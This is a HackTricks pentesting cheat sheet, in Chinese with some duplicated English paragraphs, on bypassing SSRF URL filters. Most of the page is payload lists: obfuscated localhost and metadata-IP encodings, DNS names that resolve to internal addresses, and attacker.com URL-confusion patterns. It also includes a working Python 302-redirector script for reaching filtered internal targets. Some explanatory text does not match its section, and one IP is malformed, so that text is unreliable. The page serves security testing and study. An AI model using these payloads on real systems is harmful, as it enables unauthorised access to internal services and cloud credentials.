# URL格式绕过

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

### 本地主机
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
![](<../../.gitbook/assets/image (649) (1) (1).png>)

### 域名解析器

The URL format bypass technique can be used to bypass SSRF protections that rely on blacklisting certain URL formats. By manipulating the URL format, an attacker can trick the server into making requests to internal or external resources that should not be accessible.

URL格式绕过技术可用于绕过依赖于黑名单URL格式的SSRF保护措施。通过操纵URL格式，攻击者可以欺骗服务器发出对不应该可访问的内部或外部资源的请求。

One common method to bypass URL format restrictions is by using the Domain Parser technique. This technique involves manipulating the URL to make it appear as a different format that is not blacklisted.

绕过URL格式限制的一种常见方法是使用域名解析器技术。该技术涉及操纵URL，使其呈现为不在黑名单中的不同格式。

For example, if the server blocks requests to the `http` and `https` protocols, an attacker can bypass this restriction by using the `gopher` protocol instead. The `gopher` protocol is often not blacklisted and can be used to make requests to internal resources.

例如，如果服务器阻止对`http`和`https`协议的请求，攻击者可以通过使用`gopher`协议来绕过此限制。`gopher`协议通常不在黑名单中，可以用于对内部资源发出请求。

To use the Domain Parser technique, the attacker needs to identify the URL format restrictions in place and find an alternative format that is not blocked. This can be done by analyzing the server's response to different URL formats or by trial and error.

要使用域名解析器技术，攻击者需要确定URL格式限制，并找到一个未被阻止的替代格式。可以通过分析服务器对不同URL格式的响应或通过试错来完成此操作。

Once the alternative format is identified, the attacker can craft the URL to make it appear as the alternative format. This can involve manipulating the protocol, subdomains, or other components of the URL.

一旦确定了替代格式，攻击者可以构造URL，使其呈现为替代格式。这可能涉及操纵协议、子域或URL的其他组件。

By bypassing URL format restrictions, an attacker can exploit SSRF vulnerabilities to access sensitive information, perform port scanning, or launch attacks against internal resources.

通过绕过URL格式限制，攻击者可以利用SSRF漏洞访问敏感信息、执行端口扫描或对内部资源发起攻击。
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
```

```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```
### 域名混淆

Domain confusion is a technique used to bypass SSRF protection mechanisms that rely on blacklisting or filtering specific domains. It involves using alternative representations of a domain name to deceive the protection mechanism.

域名混淆是一种绕过基于黑名单或过滤特定域名的SSRF保护机制的技术。它涉及使用域名的替代表示方式来欺骗保护机制。

For example, consider a protection mechanism that blocks requests to the domain "example.com". An attacker can bypass this protection by using alternative representations of the domain, such as "exаmple.com" (with a Cyrillic "а" instead of the Latin "a") or "exɑmple.com" (with a Latin small letter alpha instead of the Latin "a").

例如，考虑一个阻止对域名"example.com"的请求的保护机制。攻击者可以通过使用域名的替代表示方式来绕过此保护，例如"exаmple.com"（使用西里尔字母"a"代替拉丁字母"a"）或"exɑmple.com"（使用拉丁小写字母alpha代替拉丁字母"a"）。

By using these alternative representations, the attacker can trick the protection mechanism into allowing the request to be made to the desired domain, even though it is technically a different domain.

通过使用这些替代表示方式，攻击者可以欺骗保护机制，使其允许请求发送到所需的域名，即使从技术上讲它是一个不同的域名。

It is important to note that not all protection mechanisms can be bypassed using domain confusion, as some may employ more advanced techniques to detect and block such attempts. However, it is still a useful technique to be aware of when testing for SSRF vulnerabilities.

需要注意的是，并非所有的保护机制都可以通过域名混淆来绕过，因为有些机制可能采用更高级的技术来检测和阻止此类尝试。然而，在测试SSRF漏洞时，了解这个技术仍然是有用的。
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### 路径和扩展名绕过

如果要求URL必须以路径或扩展名结尾，或者必须包含路径，您可以尝试以下绕过方法之一：
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

工具[**recollapse**](https://github.com/0xacb/recollapse)可以根据给定的输入生成变体，尝试绕过使用的正则表达式。查看[**此文章**](https://0xacb.com/2022/11/21/recollapse/)获取更多信息。

### 通过重定向绕过

可能服务器正在**过滤SSRF的原始请求**，但却没有过滤可能的**重定向**响应。\
例如，一个容易受到SSRF攻击的服务器，如`url=https://www.google.com/`，可能正在**过滤url参数**。但是，如果你使用一个[Python服务器以302状态码响应](https://pastebin.com/raw/ywAUhFrv)到你想要重定向的位置，你可能能够访问被过滤的IP地址，如127.0.0.1，甚至被过滤的**协议**，如gopher。\
[查看此报告。](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## 解释的技巧

### 反斜杠技巧

简而言之，_反斜杠技巧_依赖于两个“URL”规范之间的一个细微差别：[WHATWG URL标准](https://url.spec.whatwg.org/#url-parsing)和[RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B)。RFC3986是一个通用的、多用途的URI（统一资源标识符）语法规范，而WHATWG URL标准专门针对Web和URL（它们是URI的子集）。现代浏览器实现了WHATWG URL标准。

它们都描述了一种解析URI/URL的方式，只有一个细微的差别。WHATWG规范描述了[一个额外的字符](https://url.spec.whatwg.org/#authority-state)，即`\`，它的行为与`/`完全相同：结束主机名和权限，并开始URL的路径。

![两个规范以不同方式解析相同的URL](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### 其他混淆

![](<../../.gitbook/assets/image (629).png>)

图片来源：[https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
